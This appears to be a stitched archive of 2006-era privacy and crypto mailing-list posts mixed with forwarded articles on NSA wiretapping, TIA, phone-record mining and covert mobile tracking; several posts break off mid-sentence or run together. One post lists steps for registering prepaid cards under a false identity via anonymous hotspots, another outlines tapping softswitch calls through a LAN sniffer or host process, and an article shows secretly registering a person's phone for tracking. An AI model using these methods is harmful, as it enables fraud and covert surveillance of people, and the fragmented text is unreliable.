the state of oregon just passed a law (yet to be put into effect) that
requires a prescription from a doctor for all sudafed (pseudo
ephedrine) purchases.  the problem isn't drug addicts killing
themselves with corrosive fluids, as this would be a problem that
solves itself in short order, but rather that meth heads are idiotic
crime machines.  i've had numerous friends and acquaintances affected
by this (vehicles stolen or broken into, property damaged and/or
stolen, tweakers robbing at knife point, etc, etc) and it's getting
big brother isn't the answer, but when you get a lot of pissed off
citizens and overwhelmed police involved the solutions they settle for
are going to be ugly and invasive.
what a fucking mess...
* last week a tweaker out of jail for only a few weeks went around to
our hay growers neighbors and stole all sorts of random crap from
homes up and down the road he lived on.  everything from elk antlers
to hand made arrows for bow hunting, power tools loaded into a wheel
barrow, the most random crap.  the only reason he didn't hit our hay
grower was that last time he stole from them they went to his parents
house and told him "the next time your son steals from my home you'll
be attending a funeral".  now that's closer to an effective solution.

darknets, as the abused term appears to be currently employed, place
an emphasis on friendship as a trust/reputation metric and associate
that trusted channel with copyrighted content distribution. (even
though, as zooko pointed out, the original microsoft paper describing
darknets put more emphasis on the opaque nature of the overlay /

as anything more descriptive than "a private network of some type".

here is my preference:
- locate a store that provides pre paid mastercard/visa/amex , often
as gift cards or for internet payments.
- have someone buy one for you, buy one yourself incognito, or locate
a kiosk that dispenses and charges them like an ATM in reverse
(coinstar used to do this, though sadly that program was shut down)
- register the card via an anonymous hotspot / through tor? *grin* /
untraceable line (most of the cards work like debit/credit when
swiped, but if you want to use it for online / catalogue purchases or
put more than $500 on them you need to register via phone or website)
- create a pseudonymous identity and remember it, as you will need the
name and address later.
- send donation via the afore mentioned hotspot / untraceable line and enjoy!
P.S.  the lifecycle of these pre-paid card systems has been an
interest of mine since the late 90's.  it's weird how many of them
sprout up, last a year or two, and then disappear just as quickly as
they came.  surely there is a story behind this somewhere.  fraud? lack of interest?  the man keeping us down? :P~
P.P.S. using a hotspot anonymously can be a little tricky.  i'll let
you ponder this for a while...
P.P.P.S.  these work well for paying for VoIP service too, which gives
you a hard(er) to trace line, when used in conjunction with
$random_hotspots for situations where a phone is required.  remember
that the transaction for the VoIP gear should be anonymous as well
since the devices are identified by MAC ID.
ok, not simple, but seems to work well enough if you are cautious.  if
you are really paranoid you can layer these services until an adequate
depth of deception is in place.

i could see some county sheriff's office doing something stupid like
that with seized evidence perhaps. ("ooh! here's a bookmark labeled
'sekrit stuff', let's check it out!")
but the NSA and any other intelligence agency worth half a shit is
going to have clue.
early this year i was collecting information on telecommunications and
electrical power distribution infrastructure to see how detailed a map
publicly available sources could provide to such facilities and the
trends/assessments possible when combining data sets for pattern
i had a number of custom search tools, bots, and databases built up
internally that pulled large amounts of GIS data, LERG, industry
investments/research, maps, press releases, product catalogues, web
searches, cached documents, etc. (court documents pertaining to
telecom and power industries are full of informative details,
especially when the redaction performed in PDF for confidentiality is
only visibly obscuring text [white on white] while keeping content in
place :)
after about 6 weeks and many 100*GBytes of traffic i noticed a
peculiar echo on my line begin abruptly one day.  i'm off an old
analog switch ESS style in rural oregon and this echo/line noise was
associated with my number only (not others off same CO).
i suspected this was a one way conference / tap, which is completely
undetectable for digital systems but alters the line characteristics
of an analog switched circuit.
this was the only hint ever given that i might be under scrutiny. given the nature of my internet usage and the *.gov sites used (among
others) it would have been clear to anyone watching what i was up to. the data mining programs 'rumored' to be in use by the various
government agencies would be able to detect this type of activity
easily, so i suspect this was visible to somebody.
even still, the only clue, if it is one, was the analog conference on
my line, and this was noticeable only because i'm still hanging off
antiquated analog equipment that is rarely in use today.
while i think honey tokens are an interesting approach to independent
evaluation of intelligence / surveillance process and capability, it
would be incredibly difficult to get any information out of such a
project.  NSA and others are very skilled at the one way function of
information: a lot goes in, very very little ever comes back out, and
even then it is tightly constrained.  (i would guess no other agency
the world over has "least privilege" mastered so thoroughly)
an interesting subject for discussion perhaps, but not really useful
in the real world (tm)...

References: i would count on it, as it's a good bet the answer is yes rather than no.
i'm working on a one time pad based IPsec key daemon with a similar
purpose to what you describe.  i'll be posting here for feedback when
it's ready but the basic premise is that it provides strong ephemeral
IPsec keying using one time pads previously exchanged between peers. as long as the pads are generated and secured properly[1] you don't
need to care if $TLA has kept your IPsec traffic archives in their
acres of computing machinery.
likewise, if large qubit quantum computers suddenly become feasible or
multi ring GCF gets really fast, you don't need to worry about past
key exchanges (also archived) being compromised, as with pub key based
ISAKMP implementations.
last, such a mode needs no open ports[2], so the attack surface for
remote exploitation is limited to the IP level - only authenticated
traffic is passed up the stack, everything else is dropped.
as long as your OTP's are truly random and never compromised, the key
exchange will be secure and the only way to attack your traffic
remotely will be brute force of AES256.
[1]. securing pads is really the crux of the issue here.  i'm using
modified linux distributions for key generation (a host with no
networking capability - kernel omits all network functionality) and
IPsec termination (boot from CD/DVD, require USB fob / hardware token
+ passphrase for auth to access pads stored in encrypted volume).
[2]. this is true with an explanation: for the initial session ICMP
payloads are sent in the clear (not IPsec) to perform the encrypted
key exchange using OTP's.  once IPsec is initialized, ICMP is also
directed through IPsec via the SPD and future rekeying uses OTP's on
top of the existing IPsec SA.  i'll have more details later but in
short all traffic is authenticated or dropped, most of it
authenticated via IPsec, and the only exception being key exchange via
ICMP which is authenticated via OTP only until the first SA is
the advantage of using OTP's in addition to security is simplicity:
all buffers are fixed size, key material is small (per instance) and
the operations fast (no montgomery multiplication on very large
numbers).  even at a 1Hz rekey interval you could fit a years worth of
key exchange OTP in 100MBytes of storage.
the disadvantage is you probably need hardware entropy generation to
produce the pads in a reasonable time.  i'm using the VIA C5XL and C5P
processors for testing / runtime and these can produce more than
enough entropy for large pads without sucking /dev/random dry.
last but not least, the implicit out of band pad exchange with trusted
peers is reasonable for private group networking and other smaller
networks but would be very difficult to scale to a large organization.
 this is a feature in my eyes, as private group networks are what this
is intended for and meatspace pad exchange a desired requirement to
ensure trust is properly placed.

DWDM certainly makes it more complicated.  Of course, that same
technology allows them to send much more back. (Regarding the single
OC-3 mentioned previously.)
How they process and return the information is indeed the BIG SECRET. The old USSR taps used pods attached to the cables for recording and
were serviced periodically to pick up the collected data.
See also: If you look at the landing sites for various oceanic fiber cables you
will see that a great many of them are on "friendly" territory.  You
can be sure that these lines are tapped.  (Which brings up the issue
someone else mentioned a while ago.  We make a big deal about ECHELON
monitoring satellites, yet no one really cares about the tapping of
landing sites that carry many times more information?  Silly humans)
I presume the fiber tapping submarine is interested mainly in those
cables which don't land on friendly territory or the sections landed
between unfriendly sites. (E.g. not all data goes through all sites)
This would be a reasonable assumption.  But so would a number of other
possible techniques.  The great mystery continues...

Wiretap Whistleblower's Statement
12:25 PM Apr, 07, 2006
Former AT&T technician Mark Klein has come forward to support the
EFF's lawsuit against AT&T for its alleged complicity in the NSA's
electronic surveillance. Here, Wired News publishes Klein's public
statement in its entirety.
Full story: Ex-AT&T Worker Tells Of NSA Op
[  ]
Statement: Mark Klein, April 6, 2006
My background:
For 22 and 1/2 years I worked as an AT&T technician, first in New York
and then in California.
What I observed first-hand:
In 2002, when I was working in an AT&T office in San Francisco, the
site manager told me to expect a visit from a National Security Agency
agent, who was to interview a management-level technician for a
special job. The agent came, and by chance I met him and directed him
to the appropriate people.
In January 2003, I, along with others, toured the AT&T central office
on Folsom Street in San Francisco -- actually three floors of an SBC
building. There I saw a new room being built adjacent to the 4ESS
switch room where the public's phone calls are routed. I learned that
the person whom the NSA interviewed for the secret job was the person
working to install equipment in this room. The regular technician work
force was not allowed in the room.
In October 2003, the company transferred me to the San Francisco
building to oversee the Worldnet Internet room, which included large
routers, racks of modems for customers' dial-in services, and other
equipment. I was responsible for troubleshooting problems on the fiber
optic circuits and installing new circuits.
While doing my job, I learned that fiber optic cables from the secret
room were tapping into the Worldnet circuits by splitting off a
portion of the light signal. I saw this in a design document available
to me, entitled "Study Group 3, LGX/Splitter Wiring, San Francisco"
dated Dec. 10, 2002. I also saw design documents dated Jan. 13, 2004
and Jan. 24, 2003, which instructed technicians on connecting some of
the already in-service circuits to the "splitter" cabinet, which
diverts some of the light signal to the secret room. The circuits
listed were the Peering Links, which connect Worldnet with other
networks and hence the whole country, as well as the rest of the
One of the documents listed the equipment installed in the secret
room, and this list included a Narus STA 6400, which is a "Semantic
Traffic Analyzer". The Narus STA technology is known to be used
particularly by government intelligence agencies because of its
ability to sift through large amounts of data looking for
preprogrammed targets. The company's advertising boasts that its
technology "captures comprehensive customer usage data ... and
transforms it into actionable information.... (It) provides complete
visibility for all internet applications."
My job required me to connect new circuits to the "splitter" cabinet
and get them up and running. While working on a particularly difficult
one with a technician back East, I learned that other such "splitter"
cabinets were being installed in other cities, including Seattle, San
Jose, Los Angeles and San Diego.
What is the significance and why is it important to bring these facts to light?
Based on my understanding of the connections and equipment at issue,
it appears the NSA is capable of conducting what amounts to
vacuum-cleaner surveillance of all the data crossing the internet --
whether that be peoples' e-mail, web surfing or any other data.
Given the public debate about the constitutionality of the Bush
administration's spying on U.S. citizens without obtaining a FISA
warrant, I think it is critical that this information be brought out
into the open, and that the American people be told the truth about
the extent of the administration's warrantless surveillance practices,
particularly as it relates to the internet.
Despite what we are hearing, and considering the public track record
of this administration, I simply do not believe their claims that the
NSA's spying program is really limited to foreign communications or is
otherwise consistent with the NSA's charter or with FISA. And unlike
the controversy over targeted wiretaps of individuals' phone calls,
this potential spying appears to be applied wholesale to all sorts of
internet communications of countless citizens.

indeed; the laundering would be well implemented.  it's unlikely
highly visible raw cash infusions are the mechanism, more likely
ancillary benefits in equipment, "unrelated" contracts, facilities,
and other infrastructure.
i've seen too much infrastructure build out in these
post-telecom-crash years (esp. landing points and backbone/gigapop)
that just seems suspect.  perhaps this also falls under the various
"critical infrastructure protection" programs juiced with cash post
9/11 with passive taps as added bonus.

not really, see below.
hardware monies buy things like FPGA driven filters, and these
hardware sniffers can in turn easily talk to banks of DDR.
there was a paper at USENIX or somewhere that showed Xilinx FPGA's
programmed with up to 700+ snort filter rules that could monitor a
10GigE stream in real time (yes, 10GigE) and scaled linear; just the
kind of mechanism well funded adversaries like to brute force. [i
can't find this paper anymore, does someone else have a link / copy?]
nallatech makes some nice FPGA hardware systems that would apply:
sure, this doesn't capture everything, but i suspect these filters are
tuned more for what they want to discard (p2p movie and warez traffic,
that'd eliminate quite a chunk, right?) than for what they want to
inspect.  (that is, what they want to inspect is everything they don't
consider useless and filter out)
on a side note, the recent interference in the Sourcefire and Check
Point merger makes you wonder, doesn't it?  what kind of
classification systems is the government using from Sourcefire that is
so sensitive it must be US owned?
they don't get to play on the equipment.  they only get to splice a fiber to it.
you can buy these kinds of high capacity hardware filtering /
classifying systems but they are insanely expensive.  like
 for example.

this would be a fun exercise.  i wonder how much dark fiber is truly
"dark" these days...
a friend and i had a discussion on this very subject recently.  if you
don't mind the social network analysis but desire privacy of content,
does it matter if your encrypted comms stand out assuming they can't
break the cipher?
strong anonymity against an NSA threat model is very difficult;
sometimes privacy of content is sufficient.
in any case, i'd like to see encryption become the norm for even
trivial communications. like the Azureus enhancements Steve mentioned
this can be done in a simple and intuitive manner - it will just take
a lot of effort...

this is an excellent idea.  i've played with the old WRT54G's a little
bit and it is certainly an amenable piece of equipment for this kind
of tweaking.  i've had problems trying to get too much on a single
unit as the flash space restrictions are tight but there is still
enough space to support a decent set of services (like openvpn and tor
as you mention).
this is the only other trouble i've had with them: the crypto bits
tend to get sluggish, esp. when negotiating EDH or generating keys.
(fortunately this isn't needed all too frequently)
i haven't looked at the GS but if they support WPA2 they should also
support AES; it would be nice if this AES engine could be used for
general offload in addition to WPA2 traffic :)
i'm going to have to get one to tinker with...

@_subject: [Clips] Say Hello to Voiceprinting 
References: we used a system like this for a retail directory assistance service
called Infone.  the caller could authenticate by pin, by voice, or
both.  the voice enrollment required the caller to say "hello, infone"
three times or until a suitable voice print could be attained.
then when the caller accessed the system they would simply say "hello,
infone" and based on their incoming phone number the print was either
accepted or rejected.
the problem with these systems is that they can only select / identify
an individual from a small group of possibilities and line quality /
head colds can cause false negatives.
for example, if more than 10 people were associated with an account
the user had to enter a PIN to identify them, and then provide the
"hello, infone" voice print for further authentication.
it is also a non-trivial matter to tune the threshold for
success/failure appropriately for a given set of users.  this is all
based on probabilities so you need to set the threshold high enough
that the risk of false positives (impostors) is low enough to keep
security/losses at acceptable limits while also preventing excessive
numbers of false negatives that will annoy and aggravate your
still, the tech keeps getting (incrementally) better and it does
provide an additional layer of defence.  i'm not sure the currently
excessive costs associated with this technology are worth the benefit
though. (there are basically two companies who specialize in this
stuff (they've bought up all the rest) and they charge a premium for
these services and technologies :)

  regarding the deafening silence (where outright dismissal is not used)
in crypto circles about AQC: at what point does skepticism turn into
denial?  *grin*
a nice overview: Aharonov, et al. [3] showed that a slightly more general formulation
of adiabatic algorithms, when used for quantum-state generation, is in
fact universal for QC. Designing quantum algorithms via quantum-state
generation is a novel and potentially important direction, because it
ties into classical algorithm design techniques using Markov chains
and techniques such as bounds on conductance and spectral gaps. As a
first step, it would be interesting to even give such an algorithm for
solved problems such as quadratic residuosity or discrete logarithms.

see there are effective ways to manage this risk.  i'm not keen on posting
details here but perhaps off the record or at a later date.  you do
need to be willing to drop a suspect host, so mitigation is mainly
centered on secure initialization and subsequent vigilant monitoring
to decide when to cut out.  there are probably a thousand more
significant risks from host and application security angles, but
physical security is indeed tricky/severely limited in a remote
dedicate server scenario.
heheh, curious yellow raises its head again...  this has always been a
favorite for censorship resistance and plausible deniability.
it works ok; the processor struggles with the crypto (read: latency
and constant max load) but otherwise tolerable.  i've thought about
making a "Tor spot" configuration for access points, where transparent
http/tcp and dns proxy through Tor is provided for all associated
clients.  how useful would such a thing be?  (perhaps
personaltelco-free / personaltelco-anon dual service?)
the trade-off's and design constraints are more complicated and
context dependant.  read the draft blocking resistant Tor design
paper, it covers all these topics and provides a mostly reasonable
approach (the devil is in the details, as always...)

not too hard, actually.  softswitching makes this kind of hi jinx
relatively easy, and the Cirpack switching system Vodafone uses is
commonly available (to those steeped in EU telco at least).
[see  ]
i test systems like this from excel/lucent that use a unix host
controller communicating with one or more switch chassis full of
blades for spans of T1/E1, SS7, etc.  they send well defined packets
over ethernet to configure switch spans and perform call handling. it's an ugly binary protocol, like most are, but easily manipulated.
if you knew what you were doing it would be straightforward to insert
a promiscuous device on the LAN or add a process on the unix host used
by the softswitch that listened for incoming calls from a given set of
MIN's and one way conference these calls to a third party*.  if you
had access to a current version of the softswitch software itself for
modification it would be even easier (most companies license sources
and tailor or customize the software to run these switches so it's not
quite as simple as a generic drop in replacement).
it took "a professional" to do this, sure, but the number of people
skilled enough to pull this off is not a small number.
* the pre paid phones were probably vodafone as well, so that transit
for the conference'd calls was all on the same network and would thus
avoid using circuits from other carriers which would need to be
accounted for. (that is to say, it would be much easier to hide these
conferences as long as they stayed in network, rather than tying up
spans to external carriers which would probably trigger accounting

pretty much any softswitch technology is vulnerable to this type of attack.

this description is a bit misleading or applies to a particular

softswitching systems in house.  presumably these would be more
resistant to tampering as the detailed information required to mount
such an attack is protected via trade secret and non disclosure.

TIA Lives On
By Shane Harris, National Journal
(c) National Journal Group Inc.
Thursday, Feb. 23, 2006
A controversial counter-terrorism program, which lawmakers halted more
than two years ago amid outcries from privacy advocates, was stopped
in name only and has quietly continued within the intelligence agency
now fending off charges that it has violated the privacy of U.S.
""It is no secret that some parts of TIA lived on behind the veil of
the classified intelligence budget.""
Research under the Defense Department's Total Information Awareness
program -- which developed technologies to predict terrorist attacks
by mining government databases and the personal records of people in
the United States -- was moved from the Pentagon's
research-and-development agency to another group, which builds
technologies primarily for the National Security Agency, according to
documents obtained by National Journal and to intelligence sources
familiar with the move. The names of key projects were changed,
apparently to conceal their identities, but their funding remained
intact, often under the same contracts.
It is no secret that some parts of TIA lived on behind the veil of the
classified intelligence budget. However, the projects that moved,
their new code names, and the agencies that took them over haven't
previously been disclosed. Sources aware of the transfers declined to
speak on the record for this story because, they said, the identities
of the specific programs are classified.
Two of the most important components of the TIA program were moved to
the Advanced Research and Development Activity, housed at NSA
headquarters in Fort Meade, Md., documents and sources confirm. One
piece was the Information Awareness Prototype System, the core
architecture that tied together numerous information extraction,
analysis, and dissemination tools developed under TIA. The prototype
system included privacy-protection technologies that may have been
discontinued or scaled back following the move to ARDA.
A $19 million contract to build the prototype system was awarded in
late 2002 to Hicks & Associates, a consulting firm in Arlington, Va.,
that is run by former Defense and military officials. Congress's
decision to pull TIA's funding in late 2003 "caused a significant
amount of uncertainty for all of us about the future of our work,"
Hicks executive Brian Sharkey wrote in an e-mail to subcontractors at
the time. "Fortunately," Sharkey continued, "a new sponsor has come
forward that will enable us to continue much of our previous work."
Sources confirm that this new sponsor was ARDA. Along with the new
sponsor came a new name. "We will be describing this new effort as
'Basketball,' " Sharkey wrote, apparently giving no explanation of the
name's significance. Another e-mail from a Hicks employee, Marc
Swedenburg, reminded the company's staff that "TIA has been terminated
and should be referenced in that fashion."
Sharkey played a key role in TIA's birth, when he and a close friend,
retired Navy Vice Adm. John Poindexter, President Reagan's national
security adviser, brought the idea to Defense officials shortly after
the 9/11 attacks. The men had teamed earlier on
intelligence-technology programs for the Defense Advanced Research
Projects Agency, which agreed to host TIA and hired Poindexter to run
it in 2002. In August 2003, Poindexter was forced to resign as TIA
chief amid howls that his central role in the Iran-Contra scandal of
the mid-1980s made him unfit to run a sensitive intelligence program.
It's unclear whether work on Basketball continues. Sharkey didn't
respond to an interview request, and Poindexter said he had no comment
about former TIA programs. But a publicly available Defense Department
document, detailing various "cooperative agreements and other
transactions" conducted in fiscal 2004, shows that Basketball was
fully funded at least until the end of that year (September 2004). The
document shows that the system was being tested at a research center
jointly run by ARDA and SAIC Corp., a major defense and intelligence
contractor that is the sole owner of Hicks & Associates. The document
describes Basketball as a "closed-loop, end-to-end prototype system
for early warning and decision-making," exactly the same language used
in contract documents for the TIA prototype system when it was awarded
to Hicks in 2002. An SAIC spokesman declined to comment for this
Another key TIA project that moved to ARDA was Genoa II, which focused
on building information technologies to help analysts and policy
makers anticipate and pre-empt terrorist attacks. Genoa II was renamed
Topsail when it moved to ARDA, intelligence sources confirmed. (The
name continues the program's nautical nomenclature; "genoa" is a
synonym for the headsail of a ship.)
As recently as October 2005, SAIC was awarded a $3.7 million contract
under Topsail. According to a government-issued press release
announcing the award, "The objective of Topsail is to develop
decision-support aids for teams of intelligence analysts and policy
personnel to assist in anticipating and pre-empting terrorist threats
to U.S. interests." That language repeats almost verbatim the
boilerplate descriptions of Genoa II contained in contract documents,
Pentagon budget sheets, and speeches by the Genoa II program's former
As early as February 2003, the Pentagon planned to use Genoa II
technologies at the Army's Information Awareness Center at Fort
Belvoir, Va., according to an unclassified Defense budget document.
The awareness center was an early tester of various TIA tools,
according to former employees. A 2003 Pentagon report to Congress
shows that the Army center was part of an expansive network of
intelligence agencies, including the NSA, that experimented with the
tools. The center was also home to the Army's Able Danger program,
which has come under scrutiny after some of its members said they used
data-analysis tools to discover the name and photograph of 9/11
ringleader Mohamed Atta more than a year before the attacks.
Devices developed under Genoa II's predecessor -- which Sharkey also
managed when he worked for the Defense Department -- were used during
the invasion of Afghanistan and as part of "the continuing war on
terrorism," according to an unclassified Defense budget document.
Today, however, the future of Topsail is in question. A spokesman for
the Air Force Research Laboratory in Rome, N.Y., which administers the
program's contracts, said it's "in the process of being canceled due
to lack of funds."
It is unclear when funding for Topsail was terminated. But earlier
this month, at a Senate Intelligence Committee hearing, one of TIA's
strongest critics questioned whether intelligence officials knew that
some of its programs had been moved to other agencies. Sen. Ron Wyden,
D-Ore., asked Director of National Intelligence John Negroponte and
FBI Director Robert Mueller whether it was "correct that when [TIA]
was closed, that several ... projects were moved to various
intelligence agencies.... I and others on this panel led the effort to
close [TIA]; we want to know if Mr. Poindexter's programs are going on
somewhere else."
Negroponte and Mueller said they didn't know. But Negroponte's deputy,
Gen. Michael V. Hayden, who until recently was director of the NSA,
said, "I'd like to answer in closed session." Asked for comment,
Wyden's spokeswoman referred to his hearing statements.
The NSA is now at the center of a political firestorm over President
Bush's program to eavesdrop on the phone calls and e-mails of people
in the United States who the agency believes are connected to
terrorists abroad. While the documents on the TIA programs don't show
that their tools are used in the domestic eavesdropping, and
knowledgeable sources wouldn't discuss the matter, the TIA programs
were designed specifically to develop the kind of "early-warning
system" that the president said the NSA is running.
Documents detailing TIA, Genoa II, Basketball, and Topsail use the
phrase "early-warning system" repeatedly to describe the programs'
ultimate aims. In speeches, Poindexter has described TIA as an
early-warning and decision-making system. He conceived of TIA in part
because of frustration over the lack of such tools when he was
national security chief for Reagan.
Tom Armour, the Genoa II program manager, declined to comment for this
story. But in a previous interview, he said that ARDA -- which
absorbed the TIA programs -- has pursued technologies that would be
useful for analyzing large amounts of phone and e-mail traffic.
"That's, in fact, what the interest is," Armour said. When TIA was
still funded, its program managers and researchers had "good
coordination" with their counterparts at ARDA and discussed their
projects on a regular basis, Armour said. The former No. 2 official in
Poindexter's office, Robert Popp, averred that the NSA didn't use TIA
tools in domestic eavesdropping as part of his research. But asked
whether the agency could have used the tools apart from TIA, Popp
replied, "I can't speak to that." Asked to comment on TIA projects
that moved to ARDA, Don Weber, an NSA spokesman said, "As I'm sure you
understand, we can neither confirm nor deny actual or alleged projects
or operational capabilities; therefore, we have no information to
ARDA now is undergoing some changes of its own. The outfit is being
taken out of the NSA, placed under the control of Negroponte's office,
and given a new name. It will be called the "Disruptive Technology
Office," a reference to a term of art describing any new invention
that suddenly, and often dramatically, replaces established
procedures. Officials with the intelligence director's office did not
respond to multiple requests for comment on this story.

Taking Spying to Higher Level, Agencies Look for More Ways to Mine Data
He was alluding to databases maintained at an AT&T data center in Kansas,
which now contain electronic records of 1.92 trillion telephone calls, going
back decades. The Electronic Frontier Foundation, a digital-rights advocacy
group, has asserted in a lawsuit that the AT&T Daytona system, a giant
storehouse of calling records and Internet message routing information, was
the foundation of the N.S.A.'s effort to mine telephone records without a
An AT&T spokeswoman said the company would not comment on the claim, or
generally on matters of national security or customer privacy.
But the mining of the databases in other law enforcement investigations is
well established, with documented results. One application of the database
technology, called Security Call Analysis and Monitoring Platform, or Scamp,
offers access to about nine weeks of calling information. It currently
handles about 70,000 queries a month from fraud and law enforcement
investigators, according to AT&T documents.
A former AT&T official who had detailed knowledge of the call-record
database said the Daytona system takes great care to make certain that
anyone using the database - whether AT&T employee or law enforcement
official with a subpoena - sees only information he or she is authorized to
see, and that an audit trail keeps track of all users. Such information is
frequently used to build models of suspects' social networks.
The official, speaking on condition of anonymity because he was discussing
sensitive corporate matters, said every telephone call generated a record:
number called, time of call, duration of call, billing category and other
details. While the database does not contain such billing data as names,
addresses and credit card numbers, those records are in a linked database
that can be tapped by authorized users.
New calls are entered into the database immediately after they end, the
official said, adding, "I would characterize it as near real time."
According to a current AT&T employee, whose identity is being withheld to
avoid jeopardizing his job, the mining of the AT&T databases had a notable
success in helping investigators find the perpetrators of what was known as
the Moldovan porn scam.
In 1997 a shadowy group in Moldova, a former Soviet republic, was tricking
Internet users by enticing them to a pornography Web site that would
download a piece of software that disconnected the computer user from his
local telephone line and redialed a costly 900 number in Moldova.
While another long-distance carrier simply cut off the entire nation of
Moldova from its network, AT&T and the Moldovan authorities were able to
mine the database to track the culprits.

@_subject: Cell phone tracking services available in UK and elsewhere 
... and people wonder why i don't have a cell phone (this is one of
many reason, although the largest being annoyance rather than privacy
for me):
 Mobile tracking devices on trial
Click presenter
Your mobile phone is a beacon - a radio transmitter in a box.
Therefore it is possible to trace the signal and work out where it is.
There are now several web companies which will track your friends' and
family's phones for you, so you always know where they are.
But just how safe is it to make location details available online?
There are several reasons why you may want to track someone. You may
be a company wanting to keep tabs on employees during work hours, or a
parent wanting to check up on a child's whereabouts.
These sorts of tracking services, now available in the UK, get
information from the network about which cell your phone is currently
in, and, for a small fee, display the location on an online map.
As well as checking where a certain phone is right now, you can run
scheduled lookups, or snail trails, to record the phone's movements
throughout the day, and produce a report for you to peruse at your
Obviously you cannot just enter any mobile phone number and expect to
track someone.
First of all you need to prove your identity, via a credit card, and
then, crucially, the owner of the phone in question needs to consent
to being tracked.
The owner is sent a text message telling them about the tracking
request, to which they must reply.
The question is: is it possible to circumvent this security, and track
someone without their knowledge?
I attempted to find out, using regular contributor Guy Kewney, an
independent technology journalist and, for one day only, human guinea
I sent him on a tour of London. He could go anywhere he wanted, and I
planned to meet up with him later and tell him, hopefully, where he
had been.
Guy did not know that when I borrowed his phone for a few minutes
earlier in the day, I took the opportunity to register it on one of
the tracking services.
I received the incoming text message warning him about the tracking,
responded to it and then deleted it from his inbox.
When I gave him his phone back, Guy had no idea he was now in
possession of a consenting tracking device.
Hence, a little while later, I could watch him emerge from the tube at
the start of his tour.
But just borrowing someone's phone for a few minutes is too obvious a
loophole. It is one which has already been closed by an industry body
which oversees new technologies such as mobile tracking services.
Voluntary rules
The Mobile Broadband Group has drawn up a voluntary code of conduct
which the networks in the UK ask location providers to stick to.
One of the conditions of the code is that after a phone is registered
as a tracking device, reminder texts should be sent to the phone at
random intervals.
This way, it should be impossible for a malicious tracker to intercept
every reminder.
The problem is, those random reminders are not required to be sent
very frequently.
We tracked several phones over several days, and often had to wait for
a day or two before receiving a reminder message.
Hamish Macleod from the Mobile Broadband Group, who came up with the
code of conduct, argues this is enough.
He said: "We assessed this risk during the development of the code and
consulted obviously with all the experts that we did, and the schedule
of random alerts that we came up with we thought was adequate to
protect against the risks.
"This is a situation to be kept under review as the service is developed."
With more and more children owning mobile phones, special attention
needs to be given to who can track them.
If you are not a genuine parent or guardian, the code requires
location services to check that both the tracker and the person being
tracked can prove they are consenting adults.
Mr Macleod says: "The person that is to be located has to demonstrate
to the service provider they are at least 16 years old.
"They can do this through various channels, for example they can get a
credit card number which is used as a proxy for age verification, or
something like that."
At least, that is what is supposed to happen. But neither of the
services we tested asked the person being tracked to prove they were
an adult.
Although they did ask us for the age of the person we wanted to track,
they did not check we were telling the truth.
The companies were not following the letter of the code and, what is
more, no-one was holding them to account.
HAVE YOUR SAY
What do you make of the new mobile tracking services online? Is it
ever possible for regulation to keep up with technology?
Neither service would comment on this oversight.
Although the code of conduct was well intentioned, the Mobile
Broadband Group admits it will need refining as loopholes become
It also highlights the limits of such voluntary codes, and the
problems with policing them.
Jago Russell from the human rights group Liberty says: "We have
concerns in general about industry codes of practice. They aren't
legal regulation; they don't give the consumer an effective legal
remedy if the code of practice isn't complied with.
"So in many ways they're not really worth the paper they're written on."
As a result of our investigation, The Mobile Broadband Group is making
some changes to the code of conduct.
The frequency of the random reminders is going to be increased, and
the code will make clearer the appropriate way to check the age of the
Guy Kewney says: "It's a shame but then if you start regulating new
technology you usually fall down because people don't expect the
"The real problem is that you can't actually perceive the unintended
consequences of your technology change, so a hard and fast rule that
says 'don't do this' won't stop you doing that, in which case you've
wasted your time passing it."
Should we really be worried about being tracked by mobile phones?
Guy Kewney says: "You can worry about anything in this society. If I
wanted to track you, the easy way to do it is - well you've found one
way, but if they've closed that loophole or if it becomes tricky -
then I just hire a private detective.
---end cut---
does anyone have a list / site for good research on anonymous wireless
communications?  there seem to be few papers or projects dealing with
this particular transport method.
"We introduce anonymous wireless rings: a new computational model for
ring networks. In the well-known hardware ring each processor has two
buffers, one corresponding to each of its neighbors. In the wireless

totally unrelated commentary:
i dreamed recently i was an old man with a failing liver
(E_TOO_MUCH_DEFCON)  performing one last bemused retrospective on life
before my session expired.  i chuckled over the use of public key
encryption in a world with common large qubit quantum computers: the
relative key strengths now in use were measured in killowatts of
computation sustained over a minimum time period for key pair
generation on dedicated hardware with open ended storage (meaning
whatever you could generate within a lifetime of key pair computation
could be stored reasonably on a common storage medium)
i recall a very strong key pair started at 64 kilowatts over 100 days
but was at least conjectured to require a coherent state (raw qubit
brute force) larger than anything possible to build in our solar
nonces, digests, symmetric secrets and one time pads for key exchange
were all still measured in bytes though... *grin*
something else of potential relevance:
Hi Bill --
I know there has been some discussion on whether _strong_ primes are
needed for _RSA_.  The definition of a strong prime is a little more
involved; c.f. the paper by Rivest and Silverman
[  and also available on Ron Rivest's
web page].  I was unaware, though, that there is a debate regarding the
use of safe primes for Diffie-Hellman.  My impression is that the use of
safe primes is generally accepted to be an important practice that
thwarts various attempts to compute a discrete log (e.g.
Pohlig-Hellman); also enough safe primes and generators are published --
one may utilize them in a protocol (assuming the people who published
the list are trusted not to have deliberately chosen prime groups for
which computing a discrete log is easier :)).
I'm also not sure how the choice of primes for Diffie-Hellman relates to
the complexity of factoring as you mentioned in your post.  As far as I
know, no one (in the open community at least) has discovered a
meaningful reduction in a standard model between the Diffie-Hellman
problem over a prime group and Factoring (nor has anyone proven that
such reductions cannot exist).  The closest thing I can think of is
trying to come up with the factorization of p-1 as you might want to do
in the Pohlig-Hellman algorithm -- but in that case, the complexity
would be prohibitive if p-1 had any large prime factors...
Are you referring to performing Diffie-Hellman over some other group?
Or is there a connection that you know of and can elaborate on?

A Fabric of Illegality
[from the March 13, 2006 issue]
Now we know the truth: For months in 2002, when George W. Bush and his
top lieutenants were publicly insisting on their adherence to the
Geneva Conventions, they were privately torpedoing efforts by Alberto
Mora, the Navy's courageous general counsel, to prevent, and establish
accountability for, brutal treatment of detainees. Two years before
the publication of the Abu Ghraib photos, Mora confronted the
highest-level Pentagon officials over abuse of prisoners at Guantanamo
and warned the Administration that its interrogation policies invited
torture and cruelty. The New Yorker's Jane Mayer revealed Mora's
lonely campaign just as Kofi Annan and a team of United Nations
investigators declared Guantanamo a torture camp that should be closed
and its prisoners either tried or released.
If the Administration has so far been able to resist demands for
accountability, whether from the Pentagon's own lawyers or the UN, it
is because of the collusion of the courts and Congress in abuses both
international and within the United States. Exhibit A: the grotesque
February 16 ruling by US District Judge David Trager denying his
court's jurisdiction over the rendition to Syria and torture of
Canadian national Maher Arar, who spent nearly a year in secret
captivity (see David Cole on page 5). Exhibit B: the bipartisan effort
